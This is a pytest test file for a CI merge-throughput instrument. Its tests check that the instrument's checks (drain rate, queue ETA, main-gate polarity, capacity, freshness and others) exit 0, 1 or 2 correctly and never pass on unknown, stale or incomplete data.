"""Tests for tools/merge_throughput.py — the merge-throughput instrument (#5215).

Spec: the #5215 merge-throughput plan §10 Task 1 (owns the
pass/fail contract), §3 (protection invariants I4/I6b), §5 (measurement plan),
§11 (exit-code criteria).

The load-bearing assertion class is the CONTRACT tests: every check exits
0 only on a real numeric threshold-satisfying value, 1 on a threshold miss,
2 on UNKNOWN/absent/empty — never 0. These are the tests that make the
instrument's own exit code a non-vacuous criterion.

Hermetic: no network, no DB, no gh. Every live read is injected as a fixture
via `run_check(..., json=...)`. The one optional external read (the rail's
polarity token set) skips when the agent-infra symlink is unresolvable.
"""
from __future__ import annotations

import json as _json
import os
import re
import subprocess
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import merge_throughput as mt  # noqa: E402


def run_check(name, json=None, **opts):
    """Thin alias so the plan's verbatim assertions read naturally."""
    return mt.run_check(name, json=json, **opts)


def _iso(days_ago: float = 0.0) -> str:
    return (datetime.now(UTC) - timedelta(days=days_ago)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )


# ---------------------------------------------------------------------------
# Step 1 contract tests — verbatim from the plan (§10 Task 1 Step 1).
# ---------------------------------------------------------------------------

def test_check_threshold_is_not_satisfied_by_unknown():
    assert run_check("drain-rate", json={"merges_per_hour": "UNKNOWN"}, min=12) == 2


def test_check_missing_container_exits_2():
    assert run_check("conflicts", json={}, max=5) == 2


def test_check_missing_capacity_container_exits_2():
    assert run_check("capacity", json={}) == 2


def test_check_real_miss_is_1():
    assert run_check("queue-eta", json={"max_eta_minutes": 852}, max=120) == 1


def test_empty_enumeration_is_unknown_not_zero():
    assert run_check(
        "conflicts", json={"items": [], "total_count": 0, "read_ok": False}, max=5
    ) == 2


def test_conflicts_requires_a_population_floor():
    # A self-consistent 12-item read below a raised floor must fail (not the
    # empty-read path, which the total<1 guard already refuses).
    payload = {"items": [{"number": i, "conflicting": False} for i in range(12)],
               "total_count": 12, "read_ok": True}
    assert run_check("conflicts", json=payload, max=5, min_population=100) == 2


def test_zero_byte_body_is_unknown():
    assert mt.parse_api_body(b"") is mt.UNKNOWN


def test_html_error_body_is_unknown():
    assert mt.parse_api_body(b"<html>502</html>") is mt.UNKNOWN


def test_null_details_url_is_not_green():
    runs = [
        {"app": {"slug": "github-actions"}, "name": "changes", "status": "completed",
         "conclusion": "failure", "id": 2, "details_url": None},
        {"app": {"slug": "github-actions"}, "name": "changes", "status": "completed",
         "conclusion": "success", "id": 3, "details_url": None},
    ]
    assert mt.verdict_from_check_runs(runs) == "UNKNOWN"  # never GREEN


def test_unresolvable_singleton_success_is_not_green():
    runs = [{"name": "changes", "status": "completed", "conclusion": "success"}]
    assert mt.verdict_from_check_runs(runs) == "UNKNOWN"
    assert mt.main_gate(runs) == "UNKNOWN"
    assert mt.mergify_mergeable(runs) == "UNKNOWN"


def test_conjunct_aggregate_any_miss_is_nonzero():
    assert mt.aggregate([1, 0]) == 1 and mt.aggregate([2, 0]) == 2


def test_unknown_conclusion_is_red():
    assert mt.verdict_from_check_runs(
        [{"name": "x", "status": "completed", "conclusion": "weird_new"}]
    ) == "RED"


def test_grouping_must_not_shadow_a_red_behind_a_newer_success_in_another_workflow():
    # DISCRIMINATING fixture: an (app, name) grouping picks the globally-newest
    # attempt (id 3 = success) and returns GREEN; only (app, workflow, name)
    # sees workflow A's red.
    runs = [
        {"app": {"slug": "github-actions"}, "name": "changes", "status": "completed",
         "conclusion": "failure", "id": 2, "details_url": ".../runs/2"},   # workflow A
        {"app": {"slug": "github-actions"}, "name": "changes", "status": "completed",
         "conclusion": "success", "id": 3, "details_url": ".../runs/3"},   # workflow B
    ]
    assert mt.verdict_from_check_runs(runs) == "RED"


def test_cancelled_is_non_red_for_main_gate_but_not_mergeable():
    r = [{"name": "python-ci-gate", "status": "completed", "conclusion": "cancelled"}]
    assert mt.main_gate(r) == "NON_RED" and mt.mergify_mergeable(r) == "BLOCKED"


# ---------------------------------------------------------------------------
# Transport / parsing invariant — every check's read path.
# ---------------------------------------------------------------------------

def test_parse_api_body_parses_json():
    assert mt.parse_api_body(b'{"a": 1}') == {"a": 1}


def test_parse_api_body_non_json_is_unknown():
    assert mt.parse_api_body(b"not json at all") is mt.UNKNOWN


def test_parse_api_body_none_is_unknown():
    assert mt.parse_api_body(None) is mt.UNKNOWN


def test_parse_api_body_json_null_is_unknown():
    # A 200-OK `null` body is not a zero value either.
    assert mt.parse_api_body(b"null") is mt.UNKNOWN


def test_every_check_exits_2_on_missing_input():
    """Sweep: an empty/missing payload is never a pass for ANY check."""
    for name in mt.CHECK_NAMES:
        assert run_check(name, json={}) == 2, name


def test_every_check_rejects_a_non_json_string_payload():
    """A *string* injected where a container is expected must not read as 0."""
    for name in mt.CHECK_NAMES:
        assert run_check(name, json=mt.UNKNOWN) == 2, name


# ---------------------------------------------------------------------------
# Polarity — allow-list, null-safe, grouped by (app, workflow, name).
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("conclusion,expected", [
    ("success", "GREEN"),
    ("neutral", "GREEN"),
    ("skipped", "GREEN"),
    ("cancelled", "NON_RED"),
    ("stale", "NON_RED"),
    ("failure", "RED"),
    ("timed_out", "RED"),
    ("action_required", "RED"),
    ("startup_failure", "RED"),
    (None, "RED"),            # a null conclusion is RED, never non-red
    ("mystery_new", "RED"),   # an unrecognised conclusion is RED
])
def test_allow_list_polarity(conclusion, expected):
    runs = [{"name": "x", "status": "completed", "conclusion": conclusion,
             "details_url": ".../runs/1"}]
    assert mt.main_gate(runs) == expected


@pytest.mark.parametrize("conclusion", ["cancelled", "neutral", "skipped", None, "failure"])
def test_mergify_mergeable_only_success_satisfies(conclusion):
    runs = [{"name": "x", "status": "completed", "conclusion": conclusion,
             "details_url": ".../runs/1"}]
    assert mt.mergify_mergeable(runs) == "BLOCKED"


def test_mergify_mergeable_success_is_mergeable():
    runs = [{"name": "x", "status": "completed", "conclusion": "success",
             "details_url": ".../runs/1"}]
    assert mt.mergify_mergeable(runs) == "MERGEABLE"


def test_in_flight_is_unknown_not_green():
    runs = [{"name": "x", "status": "in_progress", "conclusion": None,
             "details_url": ".../runs/1"}]
    assert mt.main_gate(runs) == "UNKNOWN"
    assert mt.verdict_from_check_runs(runs) == "UNKNOWN"
    assert mt.mergify_mergeable(runs) == "UNKNOWN"


def test_empty_runs_is_unknown_never_green():
    assert mt.main_gate([]) == "UNKNOWN"
    assert mt.verdict_from_check_runs([]) == "UNKNOWN"
    assert mt.mergify_mergeable([]) == "UNKNOWN"


def test_newest_attempt_wins_within_a_workflow_via_resolver():
    """A re-run of the SAME job in the SAME workflow: newest id wins."""
    runs = [
        {"name": "changes", "status": "completed", "conclusion": "failure", "id": 2,
         "details_url": "u2"},
        {"name": "changes", "status": "completed", "conclusion": "success", "id": 3,
         "details_url": "u3"},
    ]
    wf = lambda run: "python-ci"  # noqa: E731
    assert mt.verdict_from_check_runs(runs, workflow_of=wf) == "GREEN"


def test_older_red_in_a_different_workflow_is_not_shadowed():
    runs = [
        {"name": "changes", "status": "completed", "conclusion": "failure", "id": 2,
         "details_url": "u2", "workflow": "ci.yml"},
        {"name": "changes", "status": "completed", "conclusion": "success", "id": 3,
         "details_url": "u3", "workflow": "python-ci.yml"},
    ]
    assert mt.verdict_from_check_runs(runs) == "RED"


def test_same_name_in_two_apps_is_two_groups():
    runs = [
        {"name": "lint", "status": "completed", "conclusion": "failure", "id": 1,
         "details_url": "u", "app": {"slug": "github-actions"}, "workflow": "w"},
        {"name": "lint", "status": "completed", "conclusion": "success", "id": 2,
         "details_url": "u", "app": {"slug": "some-app"}, "workflow": "w"},
    ]
    assert mt.verdict_from_check_runs(runs) == "RED"


def test_aggregate_all_clean_is_zero():
    assert mt.aggregate([0, 0, 0]) == 0


def test_aggregate_empty_is_zero():
    assert mt.aggregate([]) == 0


def test_aggregate_unknown_beats_miss():
    assert mt.aggregate([1, 2]) == 2


# ---------------------------------------------------------------------------
# Three-way (0 / 1 / 2) per check.
# ---------------------------------------------------------------------------

NOW = _iso(0)


def _gcheck(name, conclusion, wf="w", **extra):
    return {"name": name, "status": "completed", "conclusion": conclusion,
            "details_url": f"x/{name}", "app": {"slug": "g"}, "workflow": wf,
            **extra}


def _gate(runs, required=None, **extra):
    """A main-gate payload. `total_count` is REQUIRED: partial pagination is 2."""
    payload = {"check_runs": runs, "total_count": len(runs)}
    if required is not None:
        payload["required"] = required
    payload.update(extra)
    return payload


def test_main_gate_three_way():
    ok = _gate([_gcheck("a", "success"), _gcheck("b", "success")], ["a", "b"])
    assert run_check("main-gate", json=ok, strict=True) == 0
    bad = _gate([_gcheck("a", "success"), _gcheck("b", "failure")], ["a", "b"])
    assert run_check("main-gate", json=bad, strict=True) == 1
    assert run_check("main-gate", json={}) == 2


def test_main_gate_lax_is_diagnostic_and_pins_its_polarity(capsys):
    """Without --strict the lax allow-list applies (diagnostic only)."""
    cancelled = _gate([_gcheck("a", "cancelled")], ["a"])
    assert run_check("main-gate", json=cancelled) == 0
    assert "NON_RED" in capsys.readouterr().out
    red = _gate([_gcheck("a", "failure")], ["a"])
    assert run_check("main-gate", json=red) == 1


@pytest.mark.parametrize("status", sorted(mt.IN_FLIGHT_STATUSES))
def test_every_in_flight_status_is_unknown(status):
    run = _gcheck("a", None, status=status)
    assert mt.main_gate([run]) == "UNKNOWN"
    assert mt.verdict_from_check_runs([run]) == "UNKNOWN"
    assert mt.mergify_mergeable([run]) == "UNKNOWN"


def test_main_gate_s1_no_main_signal_arithmetic():
    # 1 observed success + NO_MAIN_SIGNAL contexts ⇒ 0 (they are reported and
    # excluded, not a completeness failure).
    one = _gate([_gcheck("a", "success")], ["a", "b", "c"])
    assert run_check("main-gate", json=one, strict=True, require_fresh=False) == 0
    # all NO_MAIN_SIGNAL ⇒ 2 (the non-vacuity guard)
    none = _gate([], ["a", "b", "c"])
    assert run_check("main-gate", json=none, strict=True) == 2
    # a required context present with failure ⇒ 1
    fail = _gate([_gcheck("a", "failure")], ["a"])
    assert run_check("main-gate", json=fail, strict=True) == 1


def test_main_gate_strict_rejects_cancelled_with_token_named(capsys):
    payload = _gate([_gcheck("python-ci-gate", "cancelled")], ["python-ci-gate"])
    assert run_check("main-gate", json=payload, strict=True) == 2
    assert "cancelled" in capsys.readouterr().out


@pytest.mark.parametrize("conclusion", ["neutral", "skipped"])
def test_main_gate_strict_rejects_neutral_and_skipped(conclusion):
    payload = _gate([_gcheck("python-ci-gate", conclusion)], ["python-ci-gate"])
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_main_gate_strict_scopes_to_required_contexts():
    # A non-required red must not false-red the required gate.
    payload = _gate(
        [_gcheck("python-ci-gate", "success"),
         _gcheck("some-other-check", "failure")],
        ["python-ci-gate"],
    )
    assert run_check("main-gate", json=payload, strict=True) == 0


def test_drain_rate_three_way():
    assert run_check("drain-rate", json={
        "merges_per_hour": 12.5, "merges": 300, "window_hours": 24}, min=12) == 0
    assert run_check("drain-rate", json={
        "merges_per_hour": 2.0, "merges": 48, "window_hours": 24}, min=12) == 1
    assert run_check("drain-rate", json={
        "merges_per_hour": 0.125, "merges": 3, "window_hours": 24}, min=12) == 2
    assert run_check("drain-rate", json={
        "merges_per_hour": 50.0, "merges": 300, "window_hours": 6}, min=12) == 2


def test_drain_rate_self_set_rate_must_reconcile():
    # 15/hr with 300 merges over 24h is not a 15/hr window.
    assert run_check("drain-rate", json={
        "merges_per_hour": 15.0, "merges": 300, "window_hours": 24}, min=12) == 2


def test_drain_rate_stale_record_is_2():
    payload = {"merges_per_hour": 12.5, "merges": 300, "window_hours": 24,
               "verified_at": _iso(30)}
    assert run_check("drain-rate", json=payload, min=12, require_fresh=True) == 2


def test_prs_per_day_three_way():
    assert run_check("prs-per-day", json={"prs_per_day": 250}, min=200) == 0
    assert run_check("prs-per-day", json={"prs_per_day": 100}, min=200) == 1
    assert run_check("prs-per-day", json={"prs_per_day": "UNKNOWN"}) == 2


def test_queue_entry_three_way():
    ok = {"pr": 5, "entered_queue": True, "trigger": "auto_merge_conditions",
          "head_sha": "abc", "run_sha": "abc", "verified_at": NOW}
    assert run_check("queue-entry", json=ok, pr=5, require_fresh=True) == 0
    human = dict(ok, trigger="human_comment")
    assert run_check("queue-entry", json=human, pr=5, require_fresh=True) == 1
    assert run_check("queue-entry", json={}) == 2


def test_queue_entry_stale_head_is_2():
    moved = {"pr": 5, "entered_queue": True, "trigger": "auto_merge_conditions",
             "head_sha": "new", "run_sha": "old", "verified_at": NOW}
    assert run_check("queue-entry", json=moved, pr=5, require_fresh=True) == 2


def test_queue_entry_pr_scoping():
    # Evidence for PR 9 must not satisfy a criterion scoped to PR 5.
    evidence = {"pr": 9, "entered_queue": True, "trigger": "auto_merge_conditions",
                "head_sha": "abc", "run_sha": "abc", "verified_at": NOW}
    assert run_check("queue-entry", json=evidence, pr=5, require_fresh=True) == 2


def test_queue_entry_out_of_window_is_2():
    old = {"pr": 5, "entered_queue": True, "trigger": "auto_merge_conditions",
           "head_sha": "abc", "run_sha": "abc", "verified_at": _iso(30)}
    assert run_check("queue-entry", json=old, pr=5, require_fresh=True) == 2


def test_queue_eta_three_way():
    assert run_check("queue-eta", json={"max_eta_minutes": 60}, max=120) == 0
    assert run_check("queue-eta", json={"max_eta_minutes": 852}, max=120) == 1
    assert run_check("queue-eta", json={"max_eta_minutes": "UNKNOWN"}, max=120) == 2


def test_queue_eta_empty_population_is_2():
    assert run_check("queue-eta", json={"items": [], "total_count": 0, "read_ok": True},
                     max=120, min_depth=1) == 2


def test_queue_eta_partial_read_is_2():
    assert run_check("queue-eta", json={
        "items": [{"eta_minutes": 10}], "total_count": 3, "read_ok": True,
        "max_eta_minutes": 10}, max=120, require_complete=True) == 2


def test_batch_size_three_way():
    ok = {"max_batch_size": 3, "events": 2, "batch_sizes": [2, 3],
          "verified_at": NOW}
    assert run_check("batch-size", json=ok, min=2, min_depth=1, require_fresh=True) == 0
    one = {"max_batch_size": 1, "events": 1, "batch_sizes": [1],
           "verified_at": NOW}
    assert run_check("batch-size", json=one, min=2, min_depth=1, require_fresh=True) == 1
    short = {"max_batch_size": 1, "events": 0, "batch_sizes": [],
             "verified_at": NOW}
    assert run_check("batch-size", json=short, min=2, min_depth=1, require_fresh=True) == 2


def test_cycle_three_way():
    q = [{"duration_minutes": 25, "heavy_leg_conclusion": "success"} for _ in range(5)]
    assert run_check("cycle", json={"runs": q, "median_minutes": 25, "qualifying": 5},
                     max=30, min_depth=5) == 0
    slow = [{"duration_minutes": 37, "heavy_leg_conclusion": "success"} for _ in range(5)]
    assert run_check("cycle", json={"runs": slow, "median_minutes": 37, "qualifying": 5},
                     max=30, min_depth=5) == 1
    short = ([{"duration_minutes": 25, "heavy_leg_conclusion": "success"}] * 2
             + [{"duration_minutes": 25, "heavy_leg_conclusion": "skipped"}] * 3)
    assert run_check("cycle", json={"runs": short, "median_minutes": 25,
                                     "qualifying": 2},
                     max=30, min_depth=5) == 2


def test_cycle_excludes_selector_skipped_runs():
    """A docs-only run concludes success but its heavy jobs are skipped."""
    runs = [{"duration_minutes": 3, "heavy_leg_conclusion": "skipped"} for _ in range(5)]
    assert run_check("cycle", json={"runs": runs, "median_minutes": 3, "qualifying": 0},
                     max=30, min_depth=5) == 2


def test_shard_balance_three_way():
    ok = {"shard_imbalance_minutes": 2.0,
          "legs": {"a": {"conclusion": "success"}, "b": {"conclusion": "success"}}}
    assert run_check("shard-balance", json=ok, max=3) == 0
    bad = dict(ok, shard_imbalance_minutes=10.0)
    assert run_check("shard-balance", json=bad, max=3) == 1
    assert run_check("shard-balance", json={}) == 2
    skipped = {"shard_imbalance_minutes": 1.0,
               "legs": {"a": {"conclusion": "skipped"}, "b": {"conclusion": "success"}}}
    assert run_check("shard-balance", json=skipped, max=3) == 2
    missing = {"shard_imbalance_minutes": 1.0, "legs": {"a": {"conclusion": "success"}}}
    assert run_check("shard-balance", json=missing, max=3) == 2


def test_fast_files_unclassified_three_way():
    assert run_check("fast-files-unclassified",
                     json={"fast_files_unclassified": []}, max=0) == 0
    assert run_check("fast-files-unclassified",
                     json={"fast_files_unclassified": ["test_x.py"]}, max=0) == 1
    assert run_check("fast-files-unclassified", json={}) == 2


def test_attribution_three_way():
    ok = {"pr": 5, "main_red": True, "verified_at": NOW,
          "red_first_observed": "2026-09-26T10:00:00Z",
          "attribution_recorded": "2026-09-26T10:03:00Z"}
    assert run_check("attribution", json=ok, pr=5, max=5, require_fresh=True) == 0
    late = dict(ok, attribution_recorded="2026-09-26T10:30:00Z")
    assert run_check("attribution", json=late, pr=5, max=5, require_fresh=True) == 1
    # a PR with no main red is not-applicable ⇒ 2, never a vacuous pass
    assert run_check("attribution", json={"pr": 5, "main_red": False},
                     pr=5, max=5) == 2


def test_attribution_pr_scoping():
    ok = {"pr": 9, "main_red": True, "verified_at": NOW,
          "red_first_observed": "2026-09-26T10:00:00Z",
          "attribution_recorded": "2026-09-26T10:03:00Z"}
    assert run_check("attribution", json=ok, pr=5, max=5, require_fresh=True) == 2


def test_capacity_three_way():
    ok = {"queued": 10, "in_progress": 3, "oldest_minutes": 60,
          "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
          "verified_at": NOW, "items": [{"id": 1}], "total_count": 1,
          "records": {f: {"verified_at": NOW}
                      for f in mt._CAPACITY_FRESH_FIELDS}}
    assert run_check("capacity", json=ok, max_oldest_minutes=120, min_headroom=1,
                     require_complete=True, require_fresh=True) == 0
    slow = dict(ok, oldest_minutes=200)
    assert run_check("capacity", json=slow, max_oldest_minutes=120, min_headroom=1,
                     require_complete=True, require_fresh=True) == 1
    at_capacity = dict(ok, capacity_at_first_failure=5)
    assert run_check("capacity", json=at_capacity, max_oldest_minutes=120,
                     min_headroom=1, require_complete=True, require_fresh=True) == 1
    assert run_check("capacity", json={}) == 2
    incomplete = dict(ok)
    incomplete.pop("items")
    assert run_check("capacity", json=incomplete, min_headroom=1,
                     require_complete=True) == 2


def test_capacity_require_fresh_needs_per_field_records():
    base = {"queued": 1, "in_progress": 1, "oldest_minutes": 5,
            "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
            "verified_at": NOW}
    # One fresh envelope record cannot vouch for the three measurements.
    assert run_check("capacity", json=base, min_headroom=1, require_fresh=True) == 2
    stale = dict(base, records={f: {"verified_at": NOW}
                                for f in mt._CAPACITY_FRESH_FIELDS})
    stale["records"]["capacity_at_first_failure"] = {"verified_at": _iso(30)}
    assert run_check("capacity", json=stale, min_headroom=1, require_fresh=True) == 2


def test_capacity_headroom_unknown_is_2():
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 5,
               "capacity_at_first_failure": "UNKNOWN",
               "configured_max_parallel_checks": 5, "verified_at": NOW}
    assert run_check("capacity", json=payload, min_headroom=1, require_fresh=True) == 2


def test_capacity_unknown_placeholders_are_2():
    payload = {"queued": "UNKNOWN", "in_progress": "UNKNOWN", "oldest_minutes": 0,
               "capacity_at_first_failure": "UNKNOWN",
               "configured_max_parallel_checks": "UNKNOWN"}
    assert run_check("capacity", json=payload, max_oldest_minutes=120) == 2


def test_capacity_stale_record_with_require_fresh_is_2():
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 5,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
               "verified_at": _iso(30),
               "records": {f: {"verified_at": _iso(30)}
                           for f in mt._CAPACITY_FRESH_FIELDS}}
    assert run_check("capacity", json=payload, min_headroom=1, require_fresh=True) == 2


def _cap_records(**overrides):
    records = {f: {"verified_at": NOW} for f in mt._CAPACITY_FRESH_FIELDS}
    records.update(overrides)
    return records


def test_parallelism_headroom_three_way():
    ok = {"capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
          "records": _cap_records()}
    assert run_check("parallelism-headroom", json=ok, require_fresh=True) == 0
    at_limit = dict(ok, configured_max_parallel_checks=8)
    assert run_check("parallelism-headroom", json=at_limit, require_fresh=True) == 1
    unknown = dict(ok, capacity_at_first_failure="UNKNOWN")
    assert run_check("parallelism-headroom", json=unknown, require_fresh=True) == 2
    # S11 and S14 must agree: a stale capacity_at_first_failure record is 2.
    stale = dict(ok, records=_cap_records(
        capacity_at_first_failure={"verified_at": _iso(30)}))
    assert run_check("parallelism-headroom", json=stale, require_fresh=True) == 2


@pytest.fixture
def gap_repo(tmp_path, monkeypatch):
    """Write the M3 record on disk and point REPO at the temp root."""
    docs = tmp_path / "docs" / "ci"
    docs.mkdir(parents=True)
    (docs / "measurements.json").write_text(
        _json.dumps({"verified_at": NOW, "value": 3}))
    monkeypatch.setattr(mt, "REPO", tmp_path)
    return tmp_path


def _gap_payload(value=2.0, record_verified_at=NOW):
    terms = {
        "ceiling": {"value": 100, "source": "S4"},
        "observed": {"value": round(100 / value, 6), "source": "M1"},
        "effective_parallel": {"value": 3, "source": "M3",
                               "record": "docs/ci/measurements.json",
                               "verified_at": record_verified_at},
        "effective_batch": {"value": 2, "source": "M5"},
        "cycle_minutes": {"value": 37, "source": "M2"},
        "wait": {"value": 1, "source": "M6"},
    }
    return {"gap": {"value": value, "terms": terms}}


def test_gap_three_way(gap_repo):
    assert run_check("gap", json=_gap_payload(1.5), max=2, require_fresh=True) == 0
    assert run_check("gap", json=_gap_payload(3.0), max=2, require_fresh=True) == 1
    assert run_check("gap", json={"gap": {"value": "UNKNOWN"}}) == 2


def test_gap_value_must_reconcile_with_ceiling_over_observed(gap_repo):
    p = _gap_payload(2.0)
    p["gap"]["value"] = 1.0  # ceiling/observed is 2.0
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_gap_requires_m3_provenance(gap_repo):
    p = _gap_payload()
    p["gap"]["terms"]["effective_parallel"]["source"] = "config-default"
    assert run_check("gap", json=p, max=2) == 2


def test_gap_source_without_record_is_2(gap_repo):
    p = _gap_payload()
    del p["gap"]["terms"]["effective_parallel"]["record"]
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_gap_stale_parallel_verified_at_is_2(gap_repo):
    p = _gap_payload(record_verified_at=_iso(30))
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_gap_stale_disk_record_is_2(tmp_path, monkeypatch):
    docs = tmp_path / "docs" / "ci"
    docs.mkdir(parents=True)
    (docs / "measurements.json").write_text(
        _json.dumps({"verified_at": _iso(30), "value": 3}))
    monkeypatch.setattr(mt, "REPO", tmp_path)
    assert run_check("gap", json=_gap_payload(), max=2, require_fresh=True) == 2


def test_gap_missing_record_on_disk_is_2(tmp_path, monkeypatch):
    monkeypatch.setattr(mt, "REPO", tmp_path)
    assert run_check("gap", json=_gap_payload(), max=2, require_fresh=True) == 2


def test_gap_inline_records_cannot_substitute_for_the_file(tmp_path, monkeypatch):
    """S13: an inline copy is not the persisted record on disk."""
    monkeypatch.setattr(mt, "REPO", tmp_path)
    p = _gap_payload()
    p["records"] = {"docs/ci/measurements.json": {"verified_at": NOW}}
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def _languish_payload(languishing=0):
    items = [{"number": i, "state": "open", "moved_in_window": True,
              "classification": "open"} for i in range(12)]
    for i in range(languishing):
        items[i]["moved_in_window"] = False
    return {"items": items, "total_count": 12, "read_ok": True,
            "window_days": 7}


def test_no_languish_three_way():
    excludes = ["hard_stop", "terminal_decision", "draft", "superseded_by"]
    assert run_check("no-languish", json=_languish_payload(0), exclude=excludes,
                     require_complete=True, require_fresh=False) == 0
    assert run_check("no-languish", json=_languish_payload(1), exclude=excludes,
                     require_complete=True, require_fresh=False) == 1
    assert run_check("no-languish", json={}) == 2


def test_no_languish_all_excluded_is_2():
    items = [{"number": i, "classification": "draft", "moved_in_window": False}
             for i in range(12)]
    payload = {"items": items, "total_count": 12, "read_ok": True}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft", "superseded_by"],
                     require_complete=True) == 2


def test_no_languish_structural_population_floor():
    payload = {"items": [{"number": 1, "classification": "open", "moved_in_window": False}],
               "total_count": 1, "read_ok": True}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft", "superseded_by"],
                     require_complete=True) == 2


def test_no_languish_stale_snapshot_is_2():
    payload = _languish_payload(0)
    payload["verified_at"] = _iso(30)
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft", "superseded_by"],
                     require_complete=True, require_fresh=True) == 2


def test_no_languish_task5_schema_is_excluded():
    items = [{"number": i, "bucket": "draft", "draft": True,
              "superseded_by": None, "moved_in_window": False} for i in range(12)]
    payload = {"items": items, "total_count": 12, "read_ok": True}
    assert run_check("no-languish", json=payload,
                     exclude=["hard_stop", "terminal_decision", "draft", "superseded_by"],
                     require_complete=True) == 2


def test_exclude_unknown_key_is_2():
    assert run_check("no-languish", json=_languish_payload(0), exclude=["not_a_key"],
                     require_complete=True) == 2


def test_baseline_fresh_three_way():
    assert run_check("baseline-fresh", json={"verified_at": NOW}, max_age_days=7) == 0
    assert run_check("baseline-fresh", json={"verified_at": _iso(30)},
                     max_age_days=7) == 1
    assert run_check("baseline-fresh", json={}) == 2


def test_future_verified_at_is_not_fresh():
    assert run_check("baseline-fresh", json={"verified_at": "2099-01-01T00:00:00Z"},
                     max_age_days=7) == 2


def test_queue_entry_non_boolean_is_2():
    payload = {"pr": 5, "entered_queue": "false",
               "trigger": "auto_merge_conditions"}
    assert run_check("queue-entry", json=payload, pr=5) == 2


def test_boolean_is_not_a_number():
    assert mt._as_number(True) is None
    assert run_check("queue-eta", json={"max_eta_minutes": True}, max=120) == 2


def test_queue_eta_self_set_max_must_reconcile():
    payload = {"items": [{"eta_minutes": 10}], "total_count": 1,
               "read_ok": True, "max_eta_minutes": 9999}
    assert run_check("queue-eta", json=payload, max=120, min_depth=1) == 2


def test_batch_size_self_set_max_must_reconcile():
    payload = {"events": 5, "batch_sizes": [1], "max_batch_size": 3,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=1,
                     require_fresh=True) == 2


def test_cycle_self_set_median_must_reconcile():
    runs = [{"duration_minutes": 37, "heavy_leg_conclusion": "success"}
            for _ in range(5)]
    assert run_check("cycle", json={"runs": runs, "median_minutes": 20},
                     max=30, min_depth=5) == 2


def test_parallelism_headroom_require_complete_reconciles():
    ok = {"capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
          "items": [{"id": 1}], "total_count": 1}
    assert run_check("parallelism-headroom", json=ok, require_complete=True) == 0
    partia = dict(ok, total_count=3)
    assert run_check("parallelism-headroom", json=partia, require_complete=True) == 2


def test_assert_queue_head_checks_three_way():
    ok = {"queue_head": "sha1", "names": ["python-ci-gate"],
          "required": ["python-ci-gate"]}
    assert run_check("assert-queue-head-checks", json=ok) == 0
    missing = {"queue_head": "sha1", "names": [], "required": ["python-ci-gate"]}
    assert run_check("assert-queue-head-checks", json=missing) == 1
    assert run_check("assert-queue-head-checks", json={"queue_head": None}) == 2


def test_assert_queue_head_empty_required_is_2():
    assert run_check("assert-queue-head-checks",
                     json={"queue_head": "sha1", "required": [], "names": []}) == 2


def test_strict_unresolvable_singleton_success_is_2():
    payload = _gate([{"name": "a", "status": "completed",
                      "conclusion": "success", "app": {"slug": "g"},
                      "details_url": None}], ["a"])
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_strict_empty_required_is_2():
    payload = _gate([_gcheck("some-other", "success")], [])
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_main_gate_require_fresh_head_binding():
    run = _gcheck("a", "success")
    matched = _gate([run], ["a"], sha="abc", live_main_sha="abc")
    assert run_check("main-gate", json=matched, strict=True, require_fresh=True) == 0
    moved = dict(matched, live_main_sha="def")
    assert run_check("main-gate", json=moved, strict=True, require_fresh=True) == 2
    missing = _gate([run], ["a"])
    assert run_check("main-gate", json=missing, strict=True, require_fresh=True) == 2


def test_unorderable_group_is_unknown_not_green():
    """Two attempts with no usable ids must not be ordered by list position."""
    runs = [
        {"app": {"slug": "g"}, "name": "a", "status": "completed",
         "conclusion": "success", "workflow": "w"},
        {"app": {"slug": "g"}, "name": "a", "status": "completed",
         "conclusion": "failure", "workflow": "w"},
    ]
    assert mt.main_gate(runs) == "UNKNOWN"
    assert mt.verdict_from_check_runs(runs) == "UNKNOWN"
    assert run_check("main-gate", json=_gate(runs, ["a"]), strict=True) == 2


def test_one_orderable_id_does_not_order_an_idless_sibling():
    runs = [
        {"app": {"slug": "g"}, "name": "a", "status": "completed",
         "conclusion": "failure", "workflow": "w"},
        {"app": {"slug": "g"}, "name": "a", "id": 5, "status": "completed",
         "conclusion": "success", "workflow": "w"},
    ]
    assert mt.mergify_mergeable(runs) == "UNKNOWN"


def test_newest_by_id_supersedes_older_red_when_ids_are_present():
    runs = [
        {"app": {"slug": "g"}, "name": "a", "id": 2, "status": "completed",
         "conclusion": "failure", "workflow": "w"},
        {"app": {"slug": "g"}, "name": "a", "id": 3, "status": "completed",
         "conclusion": "success", "workflow": "w"},
    ]
    assert mt.mergify_mergeable(runs) == "MERGEABLE"


def test_strict_reports_no_main_signal_contexts(capsys):
    payload = _gate([_gcheck("a", "success")], ["a", "b"])
    assert run_check("main-gate", json=payload, strict=True) == 0
    out = capsys.readouterr().out
    assert "NO_MAIN_SIGNAL" in out and "b" in out


def test_strict_all_contexts_absent_is_2():
    payload = _gate([_gcheck("other", "success")], ["a", "b"])
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_main_gate_partial_pagination_is_2():
    payload = {"required": ["a"], "total_count": 3, "check_runs": [
        {"name": "a", "status": "completed", "conclusion": "success",
         "details_url": "x/1", "app": {"slug": "g"}, "workflow": "w"}]}
    assert run_check("main-gate", json=payload, strict=True) == 2


